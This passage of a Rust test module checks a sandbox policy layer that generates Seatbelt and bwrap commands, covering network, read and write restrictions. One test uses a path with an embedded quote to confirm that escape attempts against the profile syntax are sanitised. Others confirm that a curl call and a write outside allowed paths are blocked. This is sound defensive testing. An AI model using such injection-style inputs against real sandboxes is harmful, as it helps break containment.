                PathBuf::from("/workspace"),
                PathBuf::from("/tmp"),
            ]),
            process_exec: Access::Allow,
        };
        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
        assert!(cmd.contains("deny file-write*"));
        assert!(cmd.contains("require-not"));
        assert!(cmd.contains("subpath \"/workspace\""));
        assert!(cmd.contains("subpath \"/tmp\""));
    }

    #[test]
    fn seatbelt_policy_deny_reads() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Deny,
            file_write: PathAccess::Deny,
            process_exec: Access::Allow,
        };
        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
        assert!(cmd.contains("deny file-read*"));
    }

    #[test]
    fn seatbelt_policy_restrict_reads() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::RestrictTo(vec![PathBuf::from("/workspace")]),
            file_write: PathAccess::Deny,
            process_exec: Access::Allow,
        };
        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
        assert!(cmd.contains("deny file-read*"));
        assert!(cmd.contains("require-not"));
        assert!(cmd.contains("subpath \"/workspace\""));
        // Should include system paths.
        assert!(cmd.contains("subpath \"/usr\""));
    }

    #[test]
    fn seatbelt_policy_rejects_path_with_quotes() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::RestrictTo(vec![
                PathBuf::from("/workspace"),
                PathBuf::from("/path/with\"quote"),
            ]),
            process_exec: Access::Allow,
        };
        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
        // Safe path should be present.
        assert!(cmd.contains("subpath \"/workspace\""));
        // Unsafe path should be rejected (not present in output).
        assert!(
            !cmd.contains("with\"quote"),
            "path with quote should be sanitized out: {cmd}"
        );
    }

    // -----------------------------------------------------------------------
    // Policy-based execution tests (platform-specific)
    // -----------------------------------------------------------------------

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn linux_policy_blocks_network() {
        use crate::tool::Tool;
        use crate::tool::bash::BashTool;

        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/tmp")]),
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy(
            "curl -s --max-time 2 https://example.com",
            &policy,
            "/tmp",
        );

        let tool = BashTool::default();
        let ctx = ToolContext::from_cwd().unwrap();
        let output = tool
            .run(serde_json::json!({"command": cmd}), &ctx)
            .await
            .unwrap();
        assert!(
            output.is_error,
            "expected network to be blocked by bwrap policy"
        );
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn linux_policy_allows_network() {
        // Verify the generated command does NOT contain --unshare-net
        // when network is allowed.  We test the command shape rather
        // than actually making a network call, since CI may not have
        // internet access.
        let policy = SandboxPolicy {
            network: Access::Allow,
            file_read: PathAccess::Allow,
            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/tmp")]),
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy("echo ok", &policy, "/tmp");
        assert!(
            !cmd.contains("--unshare-net"),
            "network: Allow should not include --unshare-net: {cmd}"
        );
        assert!(cmd.contains("bwrap"));
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn linux_policy_blocks_writes_outside_allowed() {
        use crate::tool::Tool;
        use crate::tool::bash::BashTool;

        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/tmp/sandbox-test")]),
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy(
            "touch /var/tmp/should-fail",
            &policy,
            "/tmp/sandbox-test",
        );

        let tool = BashTool::default();
        let ctx = ToolContext::from_cwd().unwrap();
        let output = tool
            .run(serde_json::json!({"command": cmd}), &ctx)
            .await
            .unwrap();
        assert!(
            output.is_error,
            "expected write to /var/tmp to be blocked: {}",
            output.content
        );
    }
}
